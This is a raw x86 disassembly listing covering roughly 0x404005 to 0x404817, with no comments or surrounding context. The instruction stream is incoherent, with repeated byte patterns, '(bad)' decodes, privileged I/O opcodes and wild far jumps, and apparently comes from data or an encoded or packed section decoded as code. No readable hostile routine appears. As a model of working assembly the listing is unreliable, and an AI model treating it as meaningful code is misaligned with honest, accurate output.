  404005:	add    eax,0x10664062
  40400a:	inc    ebx
  40400b:	bound  ebp,QWORD PTR [ebp+esi*8+0x34]
  40400f:	pop    edx
  404010:	jmp    0xaa2f:0x4245c9e4
  404017:	dec    edx
  404018:	inc    eax
  404019:	fcomp  DWORD PTR [eax]
  40401b:	repnz rol BYTE PTR [ebx-0x55],0x95
  404020:	aaa    
  404021:	fs aaa 
  404023:	cli    
  404024:	cmp    al,0xf8
  404026:	nop
  404027:	fld    DWORD PTR [eax+0x49]
  40402a:	(bad)  
  40402b:	in     al,0xda
  40402d:	xor    al,0xaf
  40402f:	imul   DWORD PTR [esi-0x38]
  404032:	test   al,0xd
  404034:	cwde   
  404035:	inc    eax
  404036:	lock pop ebx
  404038:	mov    ds:0xa84144a8,al
  40403d:	cmp    DWORD PTR [edx+0x5e44171],ecx
  404043:	int3   
  404044:	inc    ecx
  404045:	inc    eax
  404046:	add    BYTE PTR [eax],al
  404048:	add    BYTE PTR [eax+0x40],al
  40404b:	inc    ebx
  40404c:	bound  eax,QWORD PTR [eax]
  40404e:	inc    eax
  40404f:	inc    eax
  404050:	add    eax,0x62434162
  404055:	inc    eax
  404056:	js     0x404068
  404058:	inc    ecx
  404059:	add    eax,0x5404325
  40405e:	bound  eax,QWORD PTR [eax+0x40]
  404061:	inc    ecx
  404062:	inc    ebx
  404063:	push   edx
  404064:	ret    
  404065:	adc    DWORD PTR [esi+0x5f],ebp
  404068:	rol    BYTE PTR [edx+0x27],0x2a
  40406c:	or     eax,0xf3b864e8
  404071:	inc    eax
  404072:	bound  esp,QWORD PTR [ecx+edi*8]
  404075:	inc    edx
  404076:	inc    ebx
  404077:	mov    ah,BYTE PTR [ecx+0x6f]
  40407a:	les    edi,FWORD PTR [eax+0x6ed92ce2]
  404080:	push   ecx
  404081:	push   esi
  404082:	dec    edi
  404083:	sbb    BYTE PTR [ebx+0x74],al
  404086:	dec    ebx
  404087:	adc    cl,BYTE PTR [ecx+0x40]
  40408a:	and    DWORD PTR [esi-0x4bc9d15],edi
  404090:	jne    0x40405f
  404092:	sahf   
  404093:	arpl   WORD PTR [ecx],ax
  404095:	add    al,0x99
  404097:	and    eax,0x436241
  40409c:	adc    BYTE PTR [eax+0x0],al
  40409f:	add    eax,0x62410040
  4040a4:	inc    eax
  4040a5:	add    BYTE PTR [ebx-0x34],al
  4040a8:	inc    eax
  4040a9:	add    eax,0x78434040
  4040ae:	bound  eax,QWORD PTR [ecx+0x78]
  4040b1:	add    eax,0x62404043
  4040b6:	lods   eax,DWORD PTR ds:[esi]
  4040b7:	inc    ecx
  4040b8:	xor    BYTE PTR [ebx-0x66],dl
  4040bb:	clc    
  4040bc:	sub    dl,bl
  4040be:	jmp    0xabd7831a
  4040c3:	loopne 0x404114
  4040c5:	inc    eax
  4040c6:	dec    ebx
  4040c7:	mov    eax,DWORD PTR [eax+0x3c]
  4040ca:	nop
  4040cb:	scas   al,BYTE PTR es:[edi]
  4040cc:	ret    0x9439
  4040cf:	push   ebx
  4040d0:	xor    al,0x45
  4040d2:	mov    edi,0x206e53c7
  4040d7:	mov    edi,0x6640ba56
  4040dc:	mov    esp,0x42425b60
  4040e1:	test   al,0xcb
  4040e3:	fiadd  WORD PTR ds:0x7ab08843
  4040e9:	sub    BYTE PTR [edi+0x4041cbdc],bh
  4040ef:	add    eax,0x43436240
  4040f4:	add    eax,0x62004040
  4040f9:	inc    eax
  4040fa:	add    BYTE PTR [ecx+0x40],al
  4040fd:	inc    ebx
  4040fe:	test   BYTE PTR ds:0x58054041,ah
  404104:	inc    eax
  404105:	inc    eax
  404106:	bound  eax,QWORD PTR [eax+0x66]
  404109:	inc    ecx
  40410a:	inc    eax
  40410b:	add    eax,0x60e3d900
  404110:	inc    esi
  404111:	pop    ss
  404112:	mov    edi,0x276a4825
  404117:	push   esi
  404118:	inc    eax
  404119:	bound  ebx,QWORD PTR [eax+0x66]
  40411c:	inc    ecx
  40411d:	test   al,0x6b
  40411f:	xlat   BYTE PTR ds:[ebx]
  404120:	xor    ch,BYTE PTR [eax+0x45cadc67]
  404126:	push   ds
  404127:	pop    ecx
  404128:	cli    
  404129:	inc    ebp
  40412a:	test   al,0x5
  40412c:	sbb    al,0xc6
  40412e:	jae    0x4041a5
  404130:	inc    ecx
  404131:	popa   
  404132:	adc    bl,cl
  404134:	bound  edi,QWORD PTR [eax+ebx*4-0x3ec9eabd]
  40413b:	out    dx,al
  40413c:	hlt    
  40413d:	bnd jbe 0x404111
  404140:	push   esi
  404141:	add    BYTE PTR [eax],al
  404143:	inc    ebx
  404144:	inc    eax
  404145:	bound  eax,QWORD PTR ds:0x25404110
  40414b:	add    ah,cl
  40414d:	inc    ebx
  40414e:	add    eax,0x40402562
  404153:	add    BYTE PTR [eax+0x40],al
  404156:	inc    ecx
  404157:	inc    ecx
  404158:	add    eax,0x78434025
  40415d:	bound  eax,QWORD PTR [eax-0x7c]
  404160:	inc    eax
  404161:	inc    ecx
  404162:	bound  edx,QWORD PTR [ebx+eiz*2-0x68]
  404166:	test   al,0x8f
  404168:	retf   0xae40
  40416b:	retf   
  40416c:	add    eax,0x33034062
  404171:	and    al,0xbc
  404173:	mov    al,0xf8
  404175:	fwait
  404176:	out    dx,eax
  404177:	repnz rcr DWORD PTR [esi+0x7d],0xd
  40417c:	fidiv  DWORD PTR [edi+eiz*2]
  40417f:	sbb    BYTE PTR [esi+0x40],0xc3
  404183:	dec    esi
  404184:	adc    al,0x7f
  404186:	add    DWORD PTR [eax],0x40404168
  40418c:	inc    ebx
  40418d:	int3   
  40418e:	add    BYTE PTR ds:0x56240,al
  404194:	inc    ebx
  404195:	inc    eax
  404196:	inc    eax
  404197:	add    BYTE PTR [ecx+0x62],al
  40419a:	bound  eax,QWORD PTR [eax]
  40419c:	int3   
  40419d:	inc    eax
  40419e:	inc    ebx
  40419f:	add    eax,0x43624041
  4041a4:	adc    BYTE PTR [ecx+0x5],al
  4041a7:	inc    eax
  4041a8:	xor    eax,0x72cf6a41
  4041ad:	ret    
  4041ae:	mov    ?,esi
  4041b0:	cmp    ah,ah
  4041b2:	mov    al,ds:0xfac9555e
  4041b7:	inc    edi
  4041b8:	inc    eax
  4041b9:	shl    BYTE PTR [edx-0x28],0x40
  4041bd:	ss (bad) 
  4041bf:	pop    edi
  4041c0:	bound  eax,QWORD PTR [ebx+0x40]
  4041c3:	adc    BYTE PTR ds:0x4158cc40,al
  4041c9:	inc    ebx
  4041ca:	bound  eax,QWORD PTR [ecx+0x40]
  4041cd:	add    eax,0x4140
  4041d2:	and    eax,0x40400062
  4041d7:	add    eax,0x84404340
  4041dc:	int3   
  4041dd:	js     0x4041df
  4041df:	inc    ecx
  4041e0:	adc    BYTE PTR [edx+0xf],ah
  4041e3:	bound  edx,QWORD PTR es:[ebp+0xd]
  4041e7:	pop    edi
  4041e8:	pop    esp
  4041e9:	cmc    
  4041ea:	and    al,0xd6
  4041ec:	jecxz  0x404221
  4041ee:	fst    DWORD PTR [ecx-0x5]
  4041f1:	push   ds
  4041f2:	mov    bl,0x42
  4041f4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4041f5:	mov    eax,0x45315226
  4041fa:	push   esi
  4041fb:	and    ah,BYTE PTR [ebx+0x15]
  4041fe:	fs push ecx
  404200:	bound  edx,QWORD PTR [edx+0x40414000]
  404206:	inc    ebx
  404207:	bound  ax,DWORD PTR ds:0x40434100
  40420e:	add    eax,0x40054062
  404213:	bound  eax,QWORD PTR [ecx+0x40]
  404216:	inc    ebx
  404217:	inc    eax
  404218:	add    eax,0x25405841
  40421d:	bound  eax,QWORD PTR [eax+0x43]
  404220:	inc    eax
  404221:	adc    BYTE PTR [ecx-0x6844116],dl
  404227:	loopne 0x404274
  404229:	fs inc edi
  40422b:	push   ds
  40422c:	cwde   
  40422d:	xchg   esp,eax
  40422e:	(bad)  
  40422f:	sbb    BYTE PTR [ecx],cl
  404231:	neg    BYTE PTR [ecx+0x42]
  404234:	xor    eax,0x40590515
  404239:	inc    ecx
  40423a:	inc    ebx
  40423b:	inc    eax
  40423c:	add    eax,0x43406262
  404241:	inc    ecx
  404242:	adc    BYTE PTR [eax],al
  404244:	inc    eax
  404245:	add    eax,0x43000562
  40424a:	add    BYTE PTR [ecx+0x40],al
  40424d:	inc    eax
  40424e:	add    eax,0x400062
  404253:	inc    ebx
  404254:	inc    eax
  404255:	js     0x404298
  404257:	inc    ecx
  404258:	bound  eax,QWORD PTR [eax-0x58]
  40425b:	addr16 push esi
  40425d:	and    DWORD PTR [eax+0x40bdc9cb],ebp
  404263:	mov    esi,ebx
  404265:	inc    eax
  404266:	push   esp
  404267:	xchg   esp,eax
  404268:	es inc ecx
  40426a:	inc    ecx
  40426b:	mov    es,WORD PTR [edi+0x23]
  40426e:	inc    edx
  40426f:	or     eax,0x621f6042
  404274:	inc    eax
  404275:	add    eax,0x40430041
  40427a:	inc    eax
  40427b:	inc    ecx
  40427c:	inc    eax
  40427d:	inc    eax
  40427e:	bound  eax,QWORD PTR ds:0x5624300
  404284:	add    BYTE PTR [eax+0x40],al
  404287:	add    BYTE PTR [ecx+0x43],al
  40428a:	add    BYTE PTR [eax+0x41],al
  40428d:	add    eax,0x40436200
  404292:	inc    eax
  404293:	add    eax,0x627f8762
  404298:	jge    0x404263
  40429a:	mov    ebx,0x694cec63
  40429f:	inc    eax
  4042a0:	fadd   QWORD PTR [ecx-0x3c]
  4042a3:	cmp    al,0x62
  4042a5:	ret    
  4042a6:	push   esp
  4042a7:	js     0x4042e9
  4042a9:	adc    DWORD PTR [edx+0x10],0x40f3de05
  4042b0:	xor    al,0xc3
  4042b2:	clc    
  4042b3:	add    BYTE PTR [edi+0x3b74bdb0],al
  4042b9:	xchg   esp,eax
  4042ba:	aam    0x46
  4042bc:	cmp    al,0x38
  4042be:	ja     0x404301
  4042c0:	inc    eax
  4042c1:	add    eax,0x41624340
  4042c6:	test   BYTE PTR [eax],al
  4042c8:	and    eax,0x404043
  4042cd:	add    BYTE PTR ds:0x626210,al
  4042d3:	add    eax,0x43404140
  4042d8:	inc    eax
  4042d9:	inc    ecx
  4042da:	add    eax,0x10664062
  4042df:	inc    ebx
  4042e0:	(bad)  
  4042e1:	enter  0xdec,0xda
  4042e5:	cs cwde 
  4042e7:	mov    cl,0x53
  4042e9:	inc    eax
  4042ea:	dec    esp
  4042eb:	retf   
  4042ec:	push   ss
  4042ed:	je     0x404326
  4042ef:	xlat   BYTE PTR ds:[ebx]
  4042f0:	pop    edx
  4042f1:	jo     0x4042e7
  4042f3:	dec    ecx
  4042f4:	data16 test al,0xb1
  4042f7:	call   0xabe983af
  4042fc:	rol    BYTE PTR [ecx+0x34],cl
  4042ff:	jmp    0x4190b54d
  404304:	lods   al,BYTE PTR ds:[esi]
  404305:	sub    bh,BYTE PTR [ebx+0x6340777d]
  40430b:	inc    eax
  40430c:	xchg   ebp,eax
  40430d:	add    eax,0x4041cc
  404312:	add    BYTE PTR [eax],al
  404314:	inc    eax
  404315:	inc    eax
  404316:	inc    ebx
  404317:	bound  eax,QWORD PTR [eax]
  404319:	inc    eax
  40431a:	inc    eax
  40431b:	add    eax,0x62434162
  404320:	inc    eax
  404321:	js     0x404333
  404323:	inc    ecx
  404324:	add    eax,0x5404325
  404329:	bound  eax,QWORD PTR [eax+0x40]
  40432c:	inc    ecx
  40432d:	inc    ebx
  40432e:	inc    esp
  40432f:	ins    BYTE PTR es:[edi],dx
  404330:	jle    0x40438d
  404332:	ins    DWORD PTR es:[edi],dx
  404333:	inc    ecx
  404334:	addr16 inc dx
  404337:	test   al,0x21
  404339:	mov    dl,0x40
  40433b:	xor    BYTE PTR [eax+edx*8+0x68594161],cl
  404342:	add    DWORD PTR [ecx+0x65],ebx
  404345:	or     DWORD PTR [edx+ebp*1+0x62412545],eax
  40434c:	inc    ebx
  40434d:	add    BYTE PTR [eax],dl
  40434f:	inc    eax
  404350:	add    BYTE PTR ds:0x62410040,al
  404356:	inc    eax
  404357:	add    BYTE PTR [ebx-0x34],al
  40435a:	inc    eax
  40435b:	add    eax,0x78434040
  404360:	bound  eax,QWORD PTR [ecx+0x78]
  404363:	add    eax,0x62404043
  404368:	inc    esp
  404369:	inc    eax
  40436a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40436b:	push   eax
  40436c:	and    eax,0xb5ca1263
  404371:	inc    eax
  404372:	inc    ebp
  404373:	or     ebx,DWORD PTR [esi+0x6e]
  404376:	pop    esp
  404377:	push   edx
  404378:	inc    esp
  404379:	adc    esi,esi
  40437b:	ror    DWORD PTR [esi],1
  40437d:	test   al,0x82
  40437f:	sub    BYTE PTR [edi-0x777cb7c0],bh
  404385:	push   ebx
  404386:	ret    
  404387:	cs inc esp
  404389:	adc    al,BYTE PTR [ebp+ecx*1-0x6f]
  40438d:	sub    al,BYTE PTR [esi+0x1b]
  404390:	inc    ecx
  404391:	inc    eax
  404392:	add    eax,0x43436240
  404397:	add    eax,0x62004040
  40439c:	inc    eax
  40439d:	add    BYTE PTR [ecx+0x40],al
  4043a0:	inc    ebx
  4043a1:	test   BYTE PTR ds:0x58054041,ah
  4043a7:	inc    eax
  4043a8:	inc    eax
  4043a9:	bound  eax,QWORD PTR [eax+0x66]
  4043ac:	inc    ecx
  4043ad:	inc    eax
  4043ae:	add    eax,0x216cbf00
  4043b3:	sbb    eax,0xf26941d4
  4043b8:	mov    bh,0x40
  4043ba:	js     0x40441f
  4043bc:	push   ebx
  4043bd:	or     DWORD PTR [eax],ebp
  4043bf:	dec    eax
  4043c0:	jge    0x4043e9
  4043c2:	mov    ah,0x70
  4043c4:	cmp    al,0xfc
  4043c6:	pusha  
  4043c7:	jl     0x4043e8
  4043c9:	or     al,0x31
  4043cb:	mov    BYTE PTR [edi+0x66],al
  4043ce:	pop    esp
  4043cf:	inc    ebx
  4043d0:	dec    edi
  4043d1:	inc    eax
  4043d2:	xchg   BYTE PTR [edx-0x52],ah
  4043d5:	dec    esi
  4043d6:	xor    DWORD PTR [eax],eax
  4043d8:	add    BYTE PTR [ebx+0x40],al
  4043db:	bound  eax,QWORD PTR ds:0x25404110
  4043e1:	add    ah,cl
  4043e3:	inc    ebx
  4043e4:	add    eax,0x40402562
  4043e9:	add    BYTE PTR [eax+0x40],al
  4043ec:	inc    ecx
  4043ed:	inc    ecx
  4043ee:	add    eax,0x78434025
  4043f3:	bound  eax,QWORD PTR [eax-0x7c]
  4043f6:	inc    eax
  4043f7:	inc    ecx
  4043f8:	cs pop ds
  4043fa:	sub    DWORD PTR [edx+0x41],edx
  4043fd:	test   eax,0xfe2d6dbc
  404402:	dec    edx
  404403:	inc    eax
  404404:	sub    dl,BYTE PTR [eax-0xc35df8c]
  40440a:	push   esp
  40440b:	add    DWORD PTR [edi+0x1dda9141],edi
  404411:	push   eax
  404412:	inc    eax
  404413:	scas   al,BYTE PTR es:[edi]
  404414:	inc    ecx
  404415:	inc    eax
  404416:	inc    eax
  404417:	inc    ebx
  404418:	int3   
  404419:	add    BYTE PTR ds:0x56240,al
  40441f:	inc    ebx
  404420:	inc    eax
  404421:	inc    eax
  404422:	add    BYTE PTR [ecx+0x62],al
  404425:	bound  eax,QWORD PTR [eax]
  404427:	int3   
  404428:	inc    eax
  404429:	inc    ebx
  40442a:	add    eax,0x43624041
  40442f:	adc    BYTE PTR [ecx+0x5],al
  404432:	inc    eax
  404433:	sub    bl,BYTE PTR [ecx-0x41]
  404436:	(bad)
  404439:	xor    eax,0x20880fb8
  40443e:	dec    edi
  40443f:	pop    ds
  404440:	outs   dx,DWORD PTR ds:[esi]
  404441:	fs loope 0x404478
  404444:	ins    BYTE PTR es:[edi],dx
  404445:	inc    edi
  404446:	inc    eax
  404447:	push   0xffffffb3
  404449:	inc    eax
  40444a:	inc    esp
  40444b:	inc    ebx
  40444c:	mov    edi,0x17e344d3
  404451:	xor    eax,DWORD PTR [ebx+0x2e]
  404454:	pushf  
  404455:	sub    BYTE PTR [eax],bh
  404457:	fwait
  404458:	mov    dh,0x40
  40445a:	xlat   BYTE PTR ds:[ebx]
  40445b:	cmp    BYTE PTR [ebp-0x58],ah
  40445e:	ret    
  40445f:	xchg   esi,eax
  404460:	add    DWORD PTR [ecx],edi
  404462:	bound  eax,QWORD PTR [ebx+0x40]
  404465:	adc    BYTE PTR ds:0x4158cc40,al
  40446b:	inc    ebx
  40446c:	bound  eax,QWORD PTR [ecx+0x40]
  40446f:	add    eax,0x4140
  404474:	and    eax,0x40400062
  404479:	add    eax,0x84404340
  40447e:	int3   
  40447f:	js     0x404481
  404481:	inc    ecx
  404482:	adc    BYTE PTR [edx+0xf],ah
  404485:	cwde   
  404486:	rcr    DWORD PTR [ecx-0x60d5b7c0],0xf8
  40448d:	arpl   WORD PTR [esp+ebp*2+0x2a],bx
  404491:	add    eax,0xa440169f
  404496:	bound  edx,QWORD PTR [edx+0x41]
  404499:	retf   
  40449a:	dec    ecx
  40449b:	mov    esi,0xb2a9a82b
  4044a0:	mov    esp,0xe244dd40
  4044a5:	inc    eax
  4044a6:	inc    esp
  4044a7:	cld    
  4044a8:	and    al,0x40
  4044aa:	pop    edi
  4044ab:	jno    0x4044ed
  4044ad:	inc    eax
  4044ae:	inc    edx
  4044af:	arpl   WORD PTR [ebx+eax*2+0x414000d5],di
  4044b6:	inc    eax
  4044b7:	inc    ebx
  4044b8:	bound  ax,DWORD PTR ds:0x40434100
  4044bf:	add    eax,0x40054062
  4044c4:	bound  eax,QWORD PTR [ecx+0x40]
  4044c7:	inc    ebx
  4044c8:	inc    eax
  4044c9:	add    eax,0x25405841
  4044ce:	bound  eax,QWORD PTR [eax+0x43]
  4044d1:	inc    eax
  4044d2:	adc    BYTE PTR [eax+eiz*2+0x43],cl
  4044d6:	and    dl,BYTE PTR es:0x38715aa9
  4044dd:	test   al,0x78
  4044df:	ins    BYTE PTR es:[edi],dx
  4044e0:	leave  
  4044e1:	dec    ebx
  4044e2:	dec    esi
  4044e3:	add    al,BYTE PTR [eax+0x28]
  4044e6:	add    ch,BYTE PTR [eax-0x48]
  4044e9:	(bad)  
  4044ea:	stos   DWORD PTR es:[edi],eax
  4044eb:	mov    cl,0x2f
  4044ed:	push   0x7
  4044ef:	dec    ecx
  4044f0:	add    eax,0x43414068
  4044f5:	inc    eax
  4044f6:	add    eax,0x43406262
  4044fb:	inc    ecx
  4044fc:	adc    BYTE PTR [eax],al
  4044fe:	inc    eax
  4044ff:	add    eax,0x43000562
  404504:	add    BYTE PTR [ecx+0x40],al
  404507:	inc    eax
  404508:	add    eax,0x400062
  40450d:	inc    ebx
  40450e:	inc    eax
  40450f:	js     0x404552
  404511:	inc    ecx
  404512:	bound  eax,QWORD PTR [eax-0x11]
  404515:	inc    eax
  404516:	inc    eax
  404517:	xor    eax,0x68c9e846
  40451c:	pop    ebp
  40451d:	mov    cl,0x29
  40451f:	inc    esi
  404520:	fstp   QWORD PTR fs:[edx+0x400023be]
  404527:	pop    ebx
  404528:	xor    eax,0x6fccb70d
  40452d:	push   ebp
  40452e:	xor    al,0x90
  404530:	je     0x40450f
  404532:	inc    eax
  404533:	into   
  404534:	div    ah
  404536:	pusha  
  404537:	dec    ebx
  404538:	inc    ebp
  404539:	pop    esp
  40453a:	xchg   edx,eax
  40453b:	test   al,0x3
  40453d:	lock bound eax,QWORD PTR [eax+0x5]
  404541:	inc    ecx
  404542:	add    BYTE PTR [ebx+0x40],al
  404545:	inc    eax
  404546:	inc    ecx
  404547:	inc    eax
  404548:	inc    eax
  404549:	bound  eax,QWORD PTR ds:0x5624300
  40454f:	add    BYTE PTR [eax+0x40],al
  404552:	add    BYTE PTR [ecx+0x43],al
  404555:	add    BYTE PTR [eax+0x41],al
  404558:	add    eax,0x40436200
  40455d:	inc    eax
  40455e:	add    eax,0x62854062
  404563:	nop
  404564:	ret    
  404565:	je     0x40452c
  404567:	pusha  
  404568:	xor    BYTE PTR [edx+0x48],al
  40456b:	les    ebx,FWORD PTR [eax+0x400e372a]
  404571:	test   BYTE PTR [ecx-0x19],0xb7
  404575:	inc    ecx
  404576:	out    0x11,al
  404578:	cmp    DWORD PTR [ebx+0x25],edi
  40457b:	xor    al,0xa2
  40457d:	aad    0xa3
  40457f:	mov    ebp,0x42793440
  404584:	mov    bh,0xe4
  404586:	mov    ah,0x14
  404588:	xor    ch,BYTE PTR [edx]
  40458a:	inc    ecx
  40458b:	inc    eax
  40458c:	add    eax,0x41624340
  404591:	test   BYTE PTR [eax],al
  404593:	and    eax,0x404043
  404598:	add    BYTE PTR ds:0x626210,al
  40459e:	add    eax,0x43404140
  4045a3:	inc    eax
  4045a4:	inc    ecx
  4045a5:	add    eax,0x10664062
  4045aa:	inc    ebx
  4045ab:	bound  edx,QWORD PTR [edx+eax*4]
  4045ae:	inc    eax
  4045af:	(bad)  
  4045b0:	cld    
  4045b1:	adc    DWORD PTR [eax-0x46],eax
  4045b4:	test   al,0xb8
  4045b6:	inc    eax
  4045b7:	mov    al,0x68
  4045b9:	retf   
  4045ba:	and    ebx,ebx
  4045bc:	adc    BYTE PTR ds:0x354e6367,cl
  4045c2:	add    eax,0x4041cc
  4045c7:	add    BYTE PTR [eax],al
  4045c9:	inc    eax
  4045ca:	inc    eax
  4045cb:	inc    ebx
  4045cc:	bound  eax,QWORD PTR [eax]
  4045ce:	inc    eax
  4045cf:	inc    eax
  4045d0:	add    eax,0x62434162
  4045d5:	inc    eax
  4045d6:	js     0x4045e8
  4045d8:	inc    ecx
  4045d9:	add    eax,0x5404325
  4045de:	bound  eax,QWORD PTR [eax+0x40]
  4045e1:	inc    ecx
  4045e2:	inc    ebx
  4045e3:	inc    eax
  4045e4:	add    BYTE PTR [ecx+ecx*8+0x50],0x9
  4045e9:	mov    al,0x23
  4045eb:	inc    eax
  4045ec:	arpl   WORD PTR [edx],ax
  4045ee:	mov    esi,0x579b62fa
  4045f3:	cs dec ebx
  4045f5:	inc    ebx
  4045f6:	das    
  4045f7:	dec    eax
  4045f8:	inc    esp
  4045f9:	int3   
  4045fa:	das    
  4045fb:	jo     0x4045a5
  4045fd:	and    DWORD PTR [edi+0x5],esp
  404600:	dec    edx
  404601:	mov    esp,DWORD PTR ds:0x436241
  404607:	adc    BYTE PTR [eax+0x0],al
  40460a:	add    eax,0x62410040
  40460f:	inc    eax
  404610:	add    BYTE PTR [ebx-0x34],al
  404613:	inc    eax
  404614:	add    eax,0x78434040
  404619:	bound  eax,QWORD PTR [ecx+0x78]
  40461c:	add    eax,0x62404043
  404621:	adc    DWORD PTR [eax+0x40],eax
  404624:	xor    BYTE PTR [eax+0x595fa9cb],al
  40462a:	pusha  
  40462b:	add    DWORD PTR [eax+0x5a],edi
  40462e:	push   edi
  40462f:	mov    al,ds:0xac40f23b
  404634:	lock inc eax
  404636:	stos   DWORD PTR es:[edi],eax
  404637:	inc    ecx
  404638:	xor    BYTE PTR [esi],ah
  40463a:	and    eax,0xc04062b0
  40463f:	int    0x5c
  404641:	dec    esp
  404642:	inc    eax
  404643:	sub    BYTE PTR [ebx+0x44],dl
  404646:	dec    eax
  404647:	mov    al,ds:0x44283177
  40464c:	stos   DWORD PTR es:[edi],eax
  40464d:	mov    ah,0x40
  40464f:	dec    ebx
  404650:	inc    ecx
  404651:	inc    eax
  404652:	add    eax,0x43436240
  404657:	add    eax,0x62004040
  40465c:	inc    eax
  40465d:	add    BYTE PTR [ecx+0x40],al
  404660:	inc    ebx
  404661:	test   BYTE PTR ds:0x58054041,ah
  404667:	inc    eax
  404668:	inc    eax
  404669:	bound  eax,QWORD PTR [eax+0x66]
  40466c:	inc    ecx
  40466d:	inc    eax
  40466e:	add    eax,0x60051f00
  404673:	mov    esi,0xe8503d7c
  404678:	add    eax,0x5290f6bb
  40467d:	sar    eax,0xa8
  404680:	stos   BYTE PTR es:[edi],al
  404681:	mov    ebx,0xb4653b60
  404686:	in     eax,dx
  404687:	dec    ecx
  404688:	lods   eax,DWORD PTR ds:[esi]
  404689:	dec    esi
  40468a:	push   eax
  40468b:	cmp    al,0x1c
  40468d:	add    eax,0x913f412c
  404692:	push   ecx
  404693:	mov    dl,0x80
  404695:	leave  
  404696:	enter  0x3277,0x2c
  40469a:	inc    ecx
  40469b:	and    BYTE PTR [edx-0x70],0xbc
  40469f:	fsub   QWORD PTR [eax-0xd]
  4046a2:	mov    eax,ds:0x43000064
  4046a7:	inc    eax
  4046a8:	bound  eax,QWORD PTR ds:0x25404110
  4046ae:	add    ah,cl
  4046b0:	inc    ebx
  4046b1:	add    eax,0x40402562
  4046b6:	add    BYTE PTR [eax+0x40],al
  4046b9:	inc    ecx
  4046ba:	inc    ecx
  4046bb:	add    eax,0x78434025
  4046c0:	bound  eax,QWORD PTR [eax-0x7c]
  4046c3:	inc    eax
  4046c4:	inc    ecx
  4046c5:	jae    0x404686
  4046c7:	bound  ebp,QWORD PTR [ebx+0x34]
  4046ca:	or     al,0x71
  4046cc:	iret   
  4046cd:	xor    al,0xc
  4046cf:	xor    eax,0x5395a588
  4046d4:	call   0x74ff903e
  4046d9:	xor    eax,0x5462d162
  4046de:	or     DWORD PTR [eax-0x54],ecx
  4046e1:	sub    BYTE PTR [ecx+0x40],al
  4046e4:	inc    eax
  4046e5:	inc    ebx
  4046e6:	int3   
  4046e7:	add    BYTE PTR ds:0x56240,al
  4046ed:	inc    ebx
  4046ee:	inc    eax
  4046ef:	inc    eax
  4046f0:	add    BYTE PTR [ecx+0x62],al
  4046f3:	bound  eax,QWORD PTR [eax]
  4046f5:	int3   
  4046f6:	inc    eax
  4046f7:	inc    ebx
  4046f8:	add    eax,0x43624041
  4046fd:	adc    BYTE PTR [ecx+0x5],al
  404700:	inc    eax
  404701:	pop    ecx
  404702:	dec    eax
  404703:	ss inc esi
  404705:	xor    BYTE PTR ds:0xf17fca47,bh
  40470b:	xchg   esp,eax
  40470c:	xor    eax,0x1f3ec314
  404711:	lahf   
  404712:	and    esp,DWORD PTR [esp+eax*8-0x52]
  404716:	xchg   ecx,eax
  404717:	aad    0xef
  404719:	jecxz  0x404773
  40471b:	lea    ebp,[ebx+0x6280bfa8]
  404721:	inc    ebx
  404722:	inc    eax
  404723:	adc    BYTE PTR ds:0x4158cc40,al
  404729:	inc    ebx
  40472a:	bound  eax,QWORD PTR [ecx+0x40]
  40472d:	add    eax,0x4140
  404732:	and    eax,0x40400062
  404737:	add    eax,0x84404340
  40473c:	int3   
  40473d:	js     0x40473f
  40473f:	inc    ecx
  404740:	adc    BYTE PTR [edx+0xf],ah
  404743:	pop    es
  404744:	jnp    0x404773
  404746:	sbb    al,0x7a
  404748:	adc    ch,BYTE PTR [ebp+eiz*2-0xa]
  40474c:	popa   
  40474d:	and    al,0xcd
  40474f:	and    cl,BYTE PTR [eax+0x45]
  404752:	inc    esp
  404753:	pop    ebp
  404754:	aas    
  404755:	jae    0x404763
  404757:	add    DWORD PTR [edx+0x47],eax
  40475a:	in     al,0xf3
  40475c:	add    BYTE PTR [eax+0x41],al
  40475f:	inc    eax
  404760:	inc    ebx
  404761:	bound  ax,DWORD PTR ds:0x40434100
  404768:	add    eax,0x40054062
  40476d:	bound  eax,QWORD PTR [ecx+0x40]
  404770:	inc    ebx
  404771:	inc    eax
  404772:	add    eax,0x25405841
  404777:	bound  eax,QWORD PTR [eax+0x43]
  40477a:	inc    eax
  40477b:	adc    BYTE PTR [eax+0x42],dl
  40477e:	in     al,dx
  40477f:	jge    0x404747
  404781:	aam    0x2a
  404783:	es repnz icebp 
  404786:	cdq    
  404787:	mov    al,0x5c
  404789:	in     eax,0xa8
  40478b:	call   0x162:0x28588bbf
  404792:	adc    dh,dh
  404794:	je     0x40472c
  404796:	fst    DWORD PTR [edx]
  404798:	shr    cl,0x48
  40479b:	xchg   DWORD PTR [eax-0x49],ebp
  40479e:	dec    eax
  40479f:	mov    esp,0x4b415444
  4047a4:	ror    DWORD PTR ds:0x43414060,cl
  4047aa:	inc    eax
  4047ab:	add    eax,0x43406262
  4047b0:	inc    ecx
  4047b1:	adc    BYTE PTR [eax],al
  4047b3:	inc    eax
  4047b4:	add    eax,0x43000562
  4047b9:	add    BYTE PTR [ecx+0x40],al
  4047bc:	inc    eax
  4047bd:	add    eax,0x400062
  4047c2:	inc    ebx
  4047c3:	inc    eax
  4047c4:	js     0x404807
  4047c6:	inc    ecx
  4047c7:	bound  eax,QWORD PTR [eax+0x43]
  4047ca:	bound  ebp,QWORD PTR [edx]
  4047cc:	inc    edi
  4047cd:	inc    edi
  4047ce:	imul   edx,DWORD PTR [ebx],0xffffffc5
  4047d1:	mov    al,0x8e
  4047d3:	dec    eax
  4047d4:	mov    al,ds:0x35f3f312
  4047d9:	fsubr  QWORD PTR [edx+ebp*1]
  4047dc:	inc    esi
  4047dd:	ins    BYTE PTR es:[edi],dx
  4047de:	imul   esp,DWORD PTR [esi],0xf0ad0a8
  4047e4:	test   al,0x93
  4047e6:	pop    edi
  4047e7:	mov    bl,0x12
  4047e9:	dec    esp
  4047ea:	stos   DWORD PTR es:[edi],eax
  4047eb:	stos   DWORD PTR es:[edi],eax
  4047ec:	adc    ah,BYTE PTR [edi-0x32471aab]
  4047f2:	add    BYTE PTR [edx+0x48],0x3d
  4047f6:	icebp  
  4047f7:	bound  eax,QWORD PTR [eax+0x5]
  4047fa:	inc    ecx
  4047fb:	add    BYTE PTR [ebx+0x40],al
  4047fe:	inc    eax
  4047ff:	inc    ecx
  404800:	inc    eax
  404801:	inc    eax
  404802:	bound  eax,QWORD PTR ds:0x5624300
  404808:	add    BYTE PTR [eax+0x40],al
  40480b:	add    BYTE PTR [ecx+0x43],al
  40480e:	add    BYTE PTR [eax+0x41],al
  404811:	add    eax,0x40436200
  404816:	inc    eax
  404817:	add    eax,0xb0413062
